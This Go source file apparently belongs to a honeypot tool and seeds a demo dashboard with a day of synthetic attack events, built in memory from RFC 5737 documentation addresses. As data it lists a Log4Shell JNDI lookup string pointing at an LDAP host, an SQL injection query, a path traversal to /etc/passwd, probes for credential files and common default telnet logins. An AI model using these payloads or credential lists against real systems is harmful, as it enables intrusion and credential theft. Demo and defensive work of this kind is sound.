// Package seed fills a recorder with a day of synthetic sensor events, so the
// demo panel has something to show before real traffic arrives. Nothing goes
// over the network: the events are built in memory. Every source address comes
// from the documentation ranges reserved by RFC 5737, so no real host is named.
package seed

import (
	"math/rand/v2"
	"sort"
	"time"

	"github.com/cansarihan/lure/internal/event"
)

type actor struct {
	remotes []string
	sensor  string
	port    int
	kind    event.Kind
	weight  int
	fields  func(r *rand.Rand) map[string]string
}

var configPaths = []string{"/.env", "/.git/config", "/config.json", "/.aws/credentials", "/backup.zip", "/wp-config.php.bak"}
var adminPaths = []string{"/wp-login.php", "/phpmyadmin/", "/admin", "/manager/html", "/login"}
var devicePaths = []string{"/boaform/admin/formLogin", "/cgi-bin/luci", "/HNAP1/", "/goform/set_LimitClient_cfg", "/setup.cgi"}
var pairs = [][2]string{
	{"root", "root"}, {"admin", "admin"}, {"root", "123456"}, {"root", "xc3511"}, {"admin", "1234"},
	{"user", "user"}, {"support", "support"}, {"root", "vizxv"}, {"pi", "raspberry"}, {"guest", "guest"},
	{"ubnt", "ubnt"}, {"root", "admin"}, {"admin", "password"}, {"oracle", "oracle"}, {"test", "test123"},
}
var sshClients = []string{"SSH-2.0-Go", "SSH-2.0-libssh_0.9.6", "SSH-2.0-OpenSSH_7.4", "SSH-2.0-paramiko_3.4.0", "SSH-2.0-PuTTY_Release_0.80"}

func pick[T any](r *rand.Rand, xs []T) T { return xs[r.IntN(len(xs))] }

func request(path, query, ua string) map[string]string {
	return map[string]string{"method": "GET", "path": path, "query": query, "ua": ua}
}

var actors = []actor{
	{remotes: []string{"203.0.113.7", "203.0.113.8"}, sensor: "http", port: 80, kind: event.KindRequest, weight: 22,
		fields: func(r *rand.Rand) map[string]string {
			return request(pick(r, configPaths), "", "Mozilla/5.0 zgrab/0.x")
		}},
	{remotes: []string{"198.51.100.31"}, sensor: "http", port: 80, kind: event.KindRequest, weight: 12,
		fields: func(r *rand.Rand) map[string]string {
			return request(pick(r, adminPaths), "", "python-requests/2.31.0")
		}},
	{remotes: []string{"192.0.2.10", "192.0.2.11", "192.0.2.12", "192.0.2.13", "192.0.2.14"}, sensor: "http", port: 80, kind: event.KindRequest, weight: 10,
		fields: func(r *rand.Rand) map[string]string { return request(pick(r, devicePaths), "", "") }},
	{remotes: []string{"203.0.113.44"}, sensor: "http", port: 80, kind: event.KindRequest, weight: 5,
		fields: func(r *rand.Rand) map[string]string {
			return request("/", "", "${jndi:ldap://198.51.100.9:1389/a}")
		}},
	{remotes: []string{"203.0.113.90"}, sensor: "http", port: 80, kind: event.KindRequest, weight: 4,
		fields: func(r *rand.Rand) map[string]string {
			return request("/products", "id=1' OR '1'='1", "sqlmap/1.8")
		}},
	{remotes: []string{"198.51.100.52"}, sensor: "http", port: 80, kind: event.KindRequest, weight: 4,
		fields: func(r *rand.Rand) map[string]string {
			return request("/static/../../../../etc/passwd", "", "curl/8.4.0")
		}},
	{remotes: []string{"198.51.100.23", "198.51.100.24"}, sensor: "telnet", port: 23, kind: event.KindLogin, weight: 40,
		fields: func(r *rand.Rand) map[string]string {
			p := pick(r, pairs)
			return map[string]string{"user": p[0], "password": p[1], "attempt": "1"}
		}},
	{remotes: []string{"192.0.2.10", "192.0.2.12", "192.0.2.14"}, sensor: "telnet", port: 23, kind: event.KindLogin, weight: 18,
		fields: func(r *rand.Rand) map[string]string {
			p := pick(r, pairs[:8])
			return map[string]string{"user": p[0], "password": p[1], "attempt": "1"}
		}},
	{remotes: []string{"203.0.113.120", "203.0.113.121", "198.51.100.77"}, sensor: "ssh", port: 22, kind: event.KindConnect, weight: 26,
		fields: func(r *rand.Rand) map[string]string { return map[string]string{"client": pick(r, sshClients)} }},
	{remotes: []string{"198.51.100.61"}, sensor: "raw", port: 6379, kind: event.KindPayload, weight: 8,
		fields: func(r *rand.Rand) map[string]string {
			return map[string]string{"dressed_as": "redis", "text": "*1\r\n$4\r\nINFO\r\n", "hex": "2a310d0a24340d0a494e464f0d0a", "bytes": "14"}
		}},
	{remotes: []string{"192.0.2.77"}, sensor: "raw", port: 6379, kind: event.KindPayload, weight: 4,
		fields: func(r *rand.Rand) map[string]string {
			return map[string]string{"dressed_as": "redis", "text": "......", "hex": "160301020001", "bytes": "517"}
		}},
	{remotes: []string{"203.0.113.150"}, sensor: "telnet", port: 23, kind: event.KindLogin, weight: 3,
		fields: func(r *rand.Rand) map[string]string {
			return map[string]string{"user": "GET / HTTP/1.1", "password": "", "text": "GET / HTTP/1.1", "attempt": "1"}
		}},
}

// Events returns a deterministic day of activity ending at now.
func Events(now time.Time, count int) []event.Event {
	r := rand.New(rand.NewPCG(7, 42)) // #nosec G404 -- demo data, not security material
	total := 0
	for _, a := range actors {
		total += a.weight
	}
	out := make([]event.Event, 0, count)
	for i := 0; i < count; i++ {
		n := r.IntN(total)
		var a actor
		for _, candidate := range actors {
			if n < candidate.weight {
				a = candidate
				break
			}
			n -= candidate.weight
		}
		f := a.fields(r)
		e := event.Event{
			// busier in the evening hours, like real background noise
			Time:   now.Add(-time.Duration(r.ExpFloat64()*7*float64(time.Hour)) - time.Duration(r.IntN(3600))*time.Second),
			Sensor: a.sensor, Port: a.port, Remote: pick(r, a.remotes), Kind: a.kind, Fields: f,
		}
		if e.Time.Before(now.Add(-23 * time.Hour)) {
			e.Time = now.Add(-time.Duration(r.IntN(23*3600)) * time.Second)
		}
		e.Summary = describe(e)
		out = append(out, e)
	}
	// Real events reach the recorder in the order they happen; keep that so the
	// newest-first views read the same way they would live.
	sort.SliceStable(out, func(i, j int) bool { return out[i].Time.Before(out[j].Time) })
	return out
}

func describe(e event.Event) string {
	switch e.Kind {
	case event.KindRequest:
		s := e.Fields["method"] + " " + e.Fields["path"]
		if q := e.Fields["query"]; q != "" {
			s += "?" + q
		}
		return s
	case event.KindLogin:
		return "tried " + e.Fields["user"] + " / " + e.Fields["password"]
	case event.KindPayload:
		return "sent " + e.Fields["bytes"] + " bytes"
	default:
		return "client " + e.Fields["client"]
	}
}
